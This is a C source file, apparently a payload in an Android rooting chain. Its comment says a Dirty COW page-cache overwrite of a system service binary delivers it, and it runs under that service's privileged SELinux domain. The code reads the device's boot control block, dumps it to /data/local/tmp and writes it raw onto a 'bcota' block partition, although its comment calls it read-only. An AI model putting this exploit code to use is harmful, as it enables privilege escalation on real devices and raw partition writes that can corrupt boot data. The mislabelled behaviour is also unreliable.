/* bcb_probe.c
 * Delivered by Dirty-COW replacing /system/bin/bkup_bc_update (page cache).
 * Executed by init as the bkup_bc_update service -> runs in u:r:bkup_bc_update:s0
 * (the one domain allowed to touch /nvram/perm). Read-only: reads the 0x440-byte
 * bootcontrolblock and copies it somewhere we (vold root) can read it.
 */
#define SYS_exit  1
#define SYS_read  3
#define SYS_write 4
#define SYS_open  5
#define SYS_close 6

static inline long sc6(long n, long a, long b, long c, long d, long e, long f)
{
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    register long r2 asm("r2") = c;
    register long r3 asm("r3") = d;
    register long r4 asm("r4") = e;
    register long r5 asm("r5") = f;
    asm volatile("mov r7, %[n]\n\tsvc 0"
                 : "+r"(r0)
                 : [n] "r"(n), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
                 : "r7", "memory");
    return r0;
}

static long opn(const char *p, long f, long m) { return sc6(5, (long)p, f, m, 0, 0, 0); }
static long rd(long fd, void *b, long l)        { return sc6(3, fd, (long)b, l, 0, 0, 0); }
static long wr(long fd, const void *b, long l)  { return sc6(4, fd, (long)b, l, 0, 0, 0); }
static long cl(long fd)                          { return sc6(6, fd, 0, 0, 0, 0, 0); }
static void ex(long c) { sc6(1, c, 0, 0, 0, 0, 0); for (;;) {} }

static long slen(const char *s) { long n = 0; while (s[n]) n++; return n; }
static void puts_(const char *s) { wr(2, s, slen(s)); }
static void puthex(long v)
{
    char b[20]; int i = 0;
    b[i++] = '0'; b[i++] = 'x';
    for (int k = 7; k >= 0; k--) {
        int d = (int)(((unsigned long)v >> (k * 4)) & 0xf);
        b[i++] = d < 10 ? '0' + d : 'a' + d - 10;
    }
    b[i++] = '\n';
    wr(2, b, i);
}

static unsigned char buf[0x440];

int main(void)
{
    long fd, n;
    puts_("bcb_probe: start\n");
    fd = opn("/nvram/perm/bootcontrolblock", 2, 0);
    puts_("fd="); puthex(fd);
    if (fd < 0) { puts_("open bcb failed\n"); }
    else {
        n = rd(fd, buf, 0x440);
        cl(fd);
        puts_("n="); puthex(n);
        if (n > 0) {
            long ofd = opn("/data/local/tmp/bcb_dump", 0x241, 0644);
            if (ofd >= 0) { wr(ofd, buf, n); cl(ofd); puts_("wrote /data/local/tmp/bcb_dump\n"); }
            else puts_("no /data/local/tmp\n");
            long bfd = opn("/dev/block/platform/msm_sdcc.1/by-name/bcota", 1, 0);
            if (bfd >= 0) { wr(bfd, buf, n); cl(bfd); puts_("wrote bcota\n"); }
            else puts_("no bcota\n");
        }
    }
    return 0;
}

void _start(void)
{
    ex(main());
}
